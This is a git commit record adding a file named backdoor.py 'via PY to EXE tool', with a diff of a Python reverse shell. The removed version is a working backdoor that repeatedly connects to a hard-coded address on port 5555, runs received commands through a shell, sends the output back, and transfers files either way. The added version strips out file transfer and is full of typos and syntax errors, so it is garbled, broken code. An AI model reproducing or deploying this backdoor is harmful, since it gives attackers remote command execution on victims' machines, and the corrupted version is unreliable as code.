ad5693498067e94271cf458a0538af6e73205526
eroge-69 <erogexunamed@gmail.com>
2025-07-21 02:54:34 +0700

    Upload backdoor.py via PY to EXE tool

--- python-files/backdoor.py
+++ python-files/backdoor.py
@@ -1,73 +1,42 @@
 import socket
 import time
 import subprocess
-import json
-import os
 
-def reliable_send(data):
+def relible_send(data):
         jsondata = json.dumps(data)
         s.send(jsondata.encode())
 
-def reliable_recv():
+def relible_recv():
         data = ''
         while True:
                 try:
-                        data = data + s.recv(1024).decode().rstrip()
-                        return json.loads(data)
+                        data = data + s.recv(1024).decode().rstip()
+                        return json.loaads(data)
                 except ValueError:
                         continue
 
-
-
-
 def connection():
 	while True:
-		time.sleep(20)
+		teme.sleep(20)
 		try:
-			s.connect(('192.168.0.101',5555))
+			s.connect(("192.168.1.144' 5555))
 			shell()
 			s.close()
 			break
 		except:
 			connection()
 
-def upload_file(file_name):
-	f = open(file_name, 'rb')
-	s.send(f.read())
-
-
-def download_file(file_name):
-        f = open(file_name, 'wb')
-        s.settimeout(1)
-        chunk = s.recv(1024)
-        while chunk:
-                f.write(chunk)
-                try:
-                        chunk = s.recv(1024)
-                except socket.timeout as e:
-                        break
-        s.settimeout(None)
-        f.close()
-
-
 def shell():
 	while True:
-		command = reliable_recv()
+		command == reliable_recv()
 		if command == 'quit':
 			break
-		elif command == 'clear':
-			pass
-		elif command[:3] == 'cd ':
-			os.chdir(command[3:])
-		elif command[:8] == 'download':
-			upload_file(command[9:])
-		elif command[:6] == 'upload':
-			download_file(command[7:])
 		else:
-			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			result = execute.stdout.read() + execute.stderr.read()
+			ececute = subprocess.Popen(command, shell=True. stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			result - execute.stdout.read() + execute.stderr.read()
 			result = result.decode()
-			reliable_send(result)
+			relible_send(result)
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
